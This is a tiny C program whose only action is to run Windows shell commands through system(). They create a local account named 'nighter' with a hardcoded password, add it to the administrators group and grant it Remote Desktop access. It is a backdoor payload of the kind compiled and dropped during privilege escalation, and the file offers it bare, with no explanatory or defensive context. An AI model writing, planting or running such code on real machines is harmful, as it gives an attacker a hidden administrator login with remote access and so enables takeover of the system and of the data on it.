#include <stdlib.h>

int main ()
{
    int i;
    i=system ("net user nighter letmein! /add && net localgroup administrators nighter /add");
    i=system("net localgroup \"Remote Desktop users\" nighter /add");
    return i;
}

